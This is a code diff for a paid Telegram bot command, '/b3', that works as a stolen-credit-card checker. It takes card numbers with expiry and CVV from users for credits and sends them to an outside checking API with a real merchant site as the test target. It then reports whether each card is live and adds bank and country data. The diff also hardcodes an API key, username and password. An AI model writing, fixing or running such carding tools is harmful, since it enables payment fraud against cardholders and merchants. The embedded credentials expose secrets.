@@ -6795,61 +6795,44 @@ import time
 import logging
 import aiohttp
 import asyncio
+import html
 from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 from db import get_user, update_user  # credit system
-import urllib.parse
 import re
 
 logger = logging.getLogger(__name__)
+logging.basicConfig(level=logging.INFO)
+
+# Try to import your BIN lookup helper; provide a safe fallback if absent
+try:
+    from bin import get_bin_info
+except Exception:
+    async def get_bin_info(bin_number: str) -> dict:
+        # fallback stub; return minimal structure expected by the code
+        return {"scheme": None, "bank": None, "country": None, "country_emoji": ""}
 
 
 # --- Cooldown and API config ---
 BASE_COOLDOWN = 5  # Base cooldown in seconds
 COOLDOWN_SECONDS = BASE_COOLDOWN
-API_URL = "https://xautob3.onrender.com/check"
-API_KEY = "XCRacker"
-SITE = "https://Xcracker911.com"
+
+# --- New API (autoxmaster) config ---
+API_URL = "https://autoxmaster.onrender.com/lbt"
+API_KEY = "Xcracker911"                       # ?key=
+API_USER = "rocky"                            # ?username=
+API_PASS = "Rocky@10010"                      # ?password=
+SITE = "https://disciplinedfinancialmanagement.com"  # default site param
+API_TIMEOUT_SECONDS = 50
 
 # --- Credit System ---
 async def consume_credit(user_id: int) -> bool:
-    try:
-        user_data = await get_user(user_id)
-        if user_data and user_data.get("credits", 0) > 0:
-            await update_user(user_id, credits=user_data["credits"] - 1)
-            return True
-    except Exception as e:
-        logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
-    return False
-
-# --- /b3 Command ---
-CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
-
-# cooldown tracker (per-user)
-user_last_command_time = {}
-
-import time
-import logging
-import aiohttp
-import asyncio
-from html import escape
-from telegram import Update
-from telegram.constants import ParseMode
-from db import get_user, update_user
-import re
-
-logger = logging.getLogger(__name__)
-
-# --- Config ---
-API_URL = "https://xautob3.onrender.com/check"
-API_KEY = "XCRacker"
-SITE = "https://Xcracker911.com"
-COOLDOWN_SECONDS = 10
-
-# --- Credit System ---
-async def consume_credit(user_id: int) -> bool:
+    """
+    Decrement one credit for the user if available.
+    Returns True if credit consumed successfully, False otherwise.
+    """
     try:
         user_data = await get_user(user_id)
         if user_data and user_data.get("credits", 0) > 0:
@@ -6865,30 +6848,39 @@ FLEX_CARD_REGEX = re.compile(
     r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
 )
 
-def normalize_card(text: str) -> str | None:
+def normalize_card(text: str | None) -> str | None:
     """
     Normalize card formats into cc|mm|yy|cvv
     Supports:
-    - 4111111111111111|07|2027|123
-    - 4111111111111111|07|27|123
-    - 4111111111111111/07/27/123
-    - 4111111111111111:07:27:123
-    - 4111111111111111 07 27 123
+      - 4111111111111111|07|2027|123
+      - 4111111111111111|07|27|123
+      - 4111111111111111/07/27/123
+      - 4111111111111111:07:27:123
+      - 4111111111111111 07 27 123
     """
+    if not text:
+        return None
     match = FLEX_CARD_REGEX.search(text)
     if not match:
         return None
     cc, mm, yy, cvv = match.groups()
-    mm = mm.zfill(2)                  # normalize → 2-digit month
+    mm = mm.zfill(2)                      # normalize → 2-digit month
     yy = yy[-2:] if len(yy) == 4 else yy  # normalize YYYY → YY
     return f"{cc}|{mm}|{yy}|{cvv}"
 
 
-# --- Cooldown tracker ---
-user_last_command_time = {}
+# --- Cooldown tracker (per-user) ---
+user_last_command_time: dict[int, float] = {}
 
 
 async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /b3 command handler
+    - extracts card from args or reply
+    - applies cooldown
+    - consumes one credit
+    - sends processing message then runs checker async
+    """
     user = update.effective_user
     user_id = user.id
     current_time = time.time()
@@ -6923,7 +6915,7 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
     user_last_command_time[user_id] = current_time
 
-    # --- Credit check BEFORE processing ---
+    # --- Credit check BEFORE processing (charge once here) ---
     credit_ok = await consume_credit(user.id)
     if not credit_ok:
         await update.message.reply_text(
@@ -6946,25 +6938,31 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
         disable_web_page_preview=True
     )
 
-    # --- Launch Braintree checker asynchronously ---
+    # --- Launch checker asynchronously (non-blocking) ---
     asyncio.create_task(run_braintree_check(user, card_data, card_data, processing_msg))
 
 
-
-async def run_braintree_check(user, cc_input, full_card, processing_msg):
+async def run_braintree_check(user, cc_input: str, full_card: str, processing_msg):
     """
-    Check Braintree Premium Auth for a card and display BIN info.
+    Calls the autoxmaster.lbt endpoint and edits the processing_msg with results.
+    Expects JSON like:
+      {"cc":"...","status":"CCN","response":"CVV Error: CVV","proxy":"dead","DEV":"@Xcracker911"}
+    NOTE: this function DOES NOT consume credits (consumed in b3()).
     """
-    import time
     start_time = time.time()
-
     developer_clickable = '<a href="https://t.me/Kalinuxxx">kคli liຖนxx</a>'
 
+    # Prepare session and request
     try:
-        # --- API request ---
-        timeout = aiohttp.ClientTimeout(total=50)
+        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT_SECONDS)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            params = {"key": API_KEY, "site": SITE, "cc": cc_input}
+            params = {
+                "key": API_KEY,
+                "site": SITE,
+                "cc": cc_input,
+                "username": API_USER,
+                "password": API_PASS,
+            }
             try:
                 async with session.get(API_URL, params=params) as resp:
                     if resp.status != 200:
@@ -6974,6 +6972,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
                         )
                         return
 
+                    # tolerant JSON parsing
                     try:
                         data = await resp.json(content_type=None)
                     except Exception:
@@ -6992,7 +6991,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
 
     except asyncio.TimeoutError:
         await processing_msg.edit_text(
-            "❌ Request timed out after 50 seconds.",
+            f"❌ Request timed out after {API_TIMEOUT_SECONDS} seconds.",
             parse_mode=ParseMode.HTML
         )
         return
@@ -7003,16 +7002,40 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         )
         return
 
-    # --- Parse API response ---
-    cc = data.get("cc", cc_input)
-    response = data.get("response", "No response")
-    status = data.get("status", "UNKNOWN").upper()
-    header_status = "✅ Approved" if status in ["APPROVED", "APPROVE"] else "❌ Declined"
+    # --- parse response safely ---
+    cc = data.get("cc", cc_input) if isinstance(data, dict) else cc_input
+    status_raw = ""
+    response_text = ""
+    proxy_info = ""
+    dev_tag = ""
+    if isinstance(data, dict):
+        status_raw = str(data.get("status", "") or "").upper()
+        response_text = data.get("response", "") or ""
+        proxy_info = data.get("proxy", "") or ""
+        dev_tag = data.get("DEV", "") or data.get("dev", "") or ""
 
-    # --- BIN lookup ---
+    # --- status mapping (adjust to taste) ---
+    if status_raw in ("APPROVED", "APPROVE", "CHARGED", "OK", "SUCCESS"):
+        header_status = "✅ Approved"
+        short_note = "Full Auth / Charged"
+    elif status_raw in ("CCN",):
+        header_status = "⚠️ CCN (Card live — CVV failed)"
+        short_note = "CCN"
+    elif status_raw in ("CVV",):
+        header_status = "⚠️ CVV (Card live — CVV incorrect)"
+        short_note = "CVV"
+    elif status_raw:
+        # any other named status — show as declined with its name
+        header_status = "❌ Declined"
+        short_note = status_raw
+    else:
+        header_status = "❌ Declined"
+        short_note = "UNKNOWN"
+
+    # --- BIN lookup (best-effort) ---
     try:
         bin_number = cc.split("|")[0][:6]
-        bin_details = await get_bin_info(bin_number)
+        bin_details = await get_bin_info(bin_number) or {}
         brand = (bin_details.get("scheme") or "N/A").title()
         issuer = bin_details.get("bank") or "N/A"
         country_name = bin_details.get("country") or "Unknown"
@@ -7022,32 +7045,26 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         country_name = "Unknown"
         country_flag = ""
 
-    # --- User info & credit check ---
+    # --- requester and elapsed ---
     full_name = " ".join(filter(None, [user.first_name, user.last_name]))
     requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
-
-    if not await consume_credit(user.id):
-        await processing_msg.edit_text(
-            "⚠️ You don’t have enough credits.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    # --- Time elapsed ---
     elapsed_time = round(time.time() - start_time, 2)
 
-    # --- Final formatted message ---
+    # --- final message ---
     final_msg = (
         f"<b><i>{header_status}</i></b>\n\n"
         f"𝐂𝐚𝐫𝐝 ➵ <code>{html.escape(full_card)}</code>\n"
-        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙪𝙩𝙝\n"
-        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(response)}</code></i>\n\n"
+        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ autoxmaster.lbt\n"
+        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(response_text)}</code></i>\n"
+        f"𝐒𝐭𝐚𝐭𝐮𝐬 ➵ <code>{escape(short_note)}</code>\n\n"
         f"<pre>"
         f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
         f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
-        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
+        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}\n"
+        f"Proxy ➵ {escape(str(proxy_info))}\n"
         f"</pre>\n\n"
-        f"𝐃𝐞𝐯 ➵ {developer_clickable}\n"
+        f"𝐃𝐞𝐯 ➵ {escape(dev_tag) if dev_tag else developer_clickable}\n"
+        f"𝐑𝐞𝐪 ➵ {requester}\n"
         f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
     )
 
@@ -7057,7 +7074,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
             parse_mode=ParseMode.HTML,
             disable_web_page_preview=True
         )
-    except Exception as e:
+    except Exception:
         logger.exception("Error editing final message")
 
 
